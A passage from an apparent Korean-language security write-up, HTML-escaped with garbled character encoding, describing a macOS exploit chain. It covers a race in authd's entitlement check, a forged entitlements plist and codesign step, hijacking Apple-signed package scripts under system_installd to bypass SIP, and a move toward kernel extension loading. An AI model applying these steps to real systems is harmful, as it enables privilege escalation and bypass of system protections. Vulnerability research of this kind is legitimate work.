            &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            
            &lt;span class=&quot;nx&quot;&gt;CFIndex&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CFArrayGetCount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rights&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CFIndex&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CFEqual&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CFArrayGetValueAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rights&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;nx&quot;&gt;entitled&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;CFReleaseSafe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
&lt;span class=&quot;nl&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;entitled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë³´ì‹œë‹¤ì‹œí”¼ í•´ë‹¹ ë¬¸ìì—´ì˜ â€œcom.apple.private.AuthorizationServicesâ€  ìê²©ì„ ê°€ì§„ ê²ƒì„ ì°¾ëŠ”ë‹¤. ì´ëŠ” array-stringìœ¼ë¡œ ë˜ì–´ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;íŠ¸ë¦¬ê±°í•˜ëŠ” ë²•ì€ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ì›í•˜ëŠ” ìê²©ìœ¼ë¡œ íŒŒì¼ì„ ë§Œë“ ë‹¤. (ì˜ˆë¥¼ ë“¤ë©´ system.install.apple-software )&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xml&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;UTF-8&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;plist&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PUBLIC&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;-&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;plist&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;version=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;com.apple.private.AuthorizationServices&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;  
        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;system.install.apple-software&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;plist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;í”„ë¡œê·¸ë¨ì„ ì‘ì„±í•˜ê³  ì ì‹œ ê¸°ë‹¤ë¦° í›„ AuthorizationRefë¥¼ ìƒì„±í•˜ê³  â€œauthdâ€ì— ê¶Œí•œì„ ìš”ì²­í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;í”„ë¡œê·¸ë¨ì„ ê¸°ë‹¤ë¦¬ëŠ” ë™ì•ˆ, â€œcodesign -f -s - â€“entitlements entitlements.xml ./testâ€ë¥¼ ì‹¤í–‰í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;â€œauthdâ€ë¡œê·¸ë¥¼ í™•ì¸í•œë‹¤. ê·¸ëŸ¬ë©´ ì•„ë˜ì™€ ê°™ì€ ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/log_authd.png&quot; alt=&quot;/assets/log_authd.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì™œ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ê¸° ì „ì— ì½”ë“œì‚¬ì¸ì„ ë¨¼ì € í•´ì•¼í•˜ëŠ”ì§€ ê¶ê¸ˆí•˜ë‹¤ë©´ AppleMobileFileIntegretyDaemon ì´ ë°ëª¬ ë•Œë¬¸ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ ë°ëª¬ì€ ë°”ì´ë„ˆë¦¬ì˜ ìê²©ê³¼ ì„œëª…ì„ ê²€ì¦í•˜ëŠ” ë°ëª¬ì¸ë°, Appleì´ ì„œëª…í•˜ì§€ ì•Šì€ í”„ë¡œê·¸ë¨ì´ë¯€ë¡œ ê¶Œí•œì´ ì œí•œë˜ì–´ ìˆê¸° ë•Œë¬¸ì— ì‹¤í–‰í•  ìˆ˜ ì—†ë‹¤.&lt;/p&gt;

&lt;p&gt;authorization.plistë¥¼ ë¶„ì„í•˜ë©´ í•´ë‹¹ ê¶Œí•œì„ ë³´ìœ í•˜ì—¬ ê¸°ë³¸ ì‚¬ìš©ìê°€ ë‹¤ìŒ ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;Right&lt;/span&gt;                                        &lt;span class=&quot;nx&quot;&gt;Private&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Framework&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;implementing&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;API&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;install&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apple&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;software&lt;/span&gt;               &lt;span class=&quot;c1&quot;&gt;// PackageKit.framework/InstallKit.framework&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;preferences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nvram&lt;/span&gt;                    &lt;span class=&quot;c1&quot;&gt;// SystemAdministrator.framework&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uninstalld&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uninstall&lt;/span&gt;              &lt;span class=&quot;c1&quot;&gt;// Uninstall.framework&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;opendirectoryd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;linkidentity&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ServiceManagement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;daemons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;modify&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// ServiceManagement.framework&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;configure&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;trust&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;install&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apple&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;// PackageKit.framework/InstallKit.framework&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;networkextension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filtering&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;install&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;software&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iap&lt;/span&gt;                 &lt;span class=&quot;c1&quot;&gt;// PackageKit.framework/InstallKit.framework&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;install&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;software&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mdm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;provided&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;// PackageKit.framework/InstallKit.framework&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;install&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apple&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;software&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;standard&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// PackageKit.framework/InstallKit.framework&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;systemconfiguration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;network&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;activitymonitor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kill&lt;/span&gt;              &lt;span class=&quot;c1&quot;&gt;// Activicymonitor?&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;XType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fontmover&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;restore&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;security&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;assessment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;networkextension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vpn&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SoftwareUpdate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scan&lt;/span&gt;               &lt;span class=&quot;c1&quot;&gt;// SoftwareUpdate.framework/InstallKit.framework&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SoftwareUpdate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;modify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;settings&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// SoftwareUpdate.framework/InstallKit.framework&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;preferences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;security&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;remotepair&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìš°ë¦¬ì—ê²ŒëŠ” system.install.* ê¶Œí•œì´ ìˆë‹¤. PackageKit.framework ì„ ë¶„ì„í•˜ë©´ í¥ë¯¸ë¡œìš´ APIê°€ ìˆìŒì„ ì•Œ ìˆ˜ ìˆë‹¤. ì´ ê¶Œí•œì€ SIPë¡œ ë³´í˜¸ë˜ì§€ ì•Šì€ ìœ„ì¹˜ì— Apple ì„œëª… íŒ¨í‚¤ì§€ë¥¼ ì„¤ì¹˜í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;ì·¨ì•½ì 2&quot;&gt;ì·¨ì•½ì 2&lt;/h3&gt;

&lt;p&gt;PKG íŒŒì¼ì€ ê¸°ë³¸ì ìœ¼ë¡œ ì„¤ì¹˜í•  íŒŒì¼, ì½”ë“œ ì„œëª… ë° pre/post-install ìŠ¤í¬ë¦½íŠ¸ë¥¼ í¬í•¨í•˜ëŠ” ì•„ì¹´ì´ë¸Œì´ë‹¤. ì´ pkgutil ìœ í‹¸ë¦¬í‹°ë¥¼ ì‚¬ìš©í•˜ë©´ ì´ëŸ¬í•œ ì•„ì¹´ì´ë¸Œì˜ ë‚´ìš©ì„ ì¶”ì¶œí•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì¼ë°˜ì ìœ¼ë¡œ pre/post-install ìŠ¤í¬ë¦½íŠ¸ëŠ” â€œinstalldâ€ì— ì˜í•´ root ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ëœë‹¤. ê·¸ëŸ¬ë‚˜ ìš°ë¦¬ëŠ” Appleì´ ì„œëª…í•˜ì§€ ì•Šì•˜ê¸° ë•Œë¬¸ì— ì•…ì˜ì ì¸ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ìì²´ íŒ¨í‚¤ì§€ë¥¼ ë§Œë“¤ ìˆ˜ ì—†ë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë ‡ë‹¤ë©´ Appleì´ ì„œëª…í•œ íŒ¨í‚¤ì§€ë¥¼ ì°¾ì€ ê²½ìš° ì–´ë–»ê²Œí•˜ë©´ ì´ëŸ¬í•œ ìŠ¤í¬ë¦½íŠ¸ ì¤‘ í•˜ë‚˜ë¥¼ ê°€ë¡œì±Œ ìˆ˜ ìˆì„ê¹Œ?&lt;/p&gt;

&lt;p&gt;íŒ¨í‚¤ì§€ê°€ Appleì— ì˜í•´ ì„œëª…ëœ ê²½ìš°, ìŠ¤í¬ë¦½íŠ¸ëŠ” â€œinstalldâ€ ì˜í•´ ì‹¤í–‰ë˜ì§€ ì•Šê³  â€œsystem_installdâ€ì— ì‹¤í–‰ ëœë‹¤.&lt;/p&gt;

&lt;p&gt;â€œsystem_installdâ€ì˜ ì°¨ì´ì ì€ â€œcom.apple.rootless.install.heritableâ€ ìê²©ì„ ê°€ì§€ê³  ìˆë‹¤. ì´ ëœ»ì€ ëª¨ë“  ìì‹ í”„ë¡œì„¸ìŠ¤ê°€ SIP ì œí•œ ì—†ì´ ì‹¤í–‰ëœë‹¤ëŠ” ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë ‡ë‹¤ë©´ ì„œëª…ëœ Apple íŒ¨í‚¤ì§€ë¥¼ ì–´ë””ì„œ ì°¾ì„ ìˆ˜ ìˆì„ê¹Œ?&lt;/p&gt;

&lt;p&gt;ì•„ë˜ì˜ ë§í¬ì—ì„œ ì°¾ì„ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://idmsa.apple.com/IDMSWebAuth/signin?appIdKey=891bd3417a7776362562d2197f89480a8547b108fd934911bcbea0110d07f757&amp;amp;path=%2Fdownload%2Fmore%2F&amp;amp;rv=1&quot;&gt;https://idmsa.apple.com/IDMSWebAuth/signin?appIdKey=891bd3417a7776362562d2197f89480a8547b108fd934911bcbea0110d07f757&amp;amp;path=%2Fdownload%2Fmore%2F&amp;amp;rv=1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;í•´ë‹¹ ë§í¬ë¥¼ ë³´ë©´ macOSPublicBetaAccessUtility.pkgì—ì„œ ê²½ë¡œê°€ ì¼ì¹˜í•˜ëŠ” í•œ ë†’ì€ ê¶Œí•œì„ ê°€ì§„ ì‹¤í–‰ íŒŒì¼ì„ ìœ„ì¡°í•  ìˆ˜ ìˆëŠ” ê±¸ ë³¼ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/systeminstalld_script.png&quot; alt=&quot;/assets/systeminstalld_script.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ì·¨ì•½ì 3&quot;&gt;ì·¨ì•½ì 3&lt;/h3&gt;

&lt;p&gt;ì´ë¯¸ SIP ìš°íšŒì™€ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ì½”ë“œ ì‹¤í–‰ì„ í•  ìˆ˜ ìˆê³  ì»¤ë„ ì½”ë“œ ì‹¤í–‰ì„ í•˜ê¸° ìœ„í•œ ë°©ë²•ì€ â€œkextutilâ€ì´ë‹¤. ì´ ìœ í‹¸ë¦¬í‹°ëŠ” ì»¤ë„ ëª¨ë“ˆì„ ë¡œë“œ/ì–¸ë¡œë“œ í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;SIPì´ ë¹„í™œì„±í™”ëœ ì‹œìŠ¤í…œì—ì„œ ì»¤ë„ ëª¨ë“ˆì„ ë¡œë“œí•˜ë ¤ëŠ” ê²½ìš° ë£¨íŠ¸ë¡œ ì¶©ë¶„í•˜ë‹¤. í•˜ì§€ë§Œ SIPì´ ìˆëŠ” ì‹œìŠ¤í…œì—ì„œëŠ” Appleì´ ì„œëª…í•œ í™•ì¥ë§Œ ë¡œë“œí•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

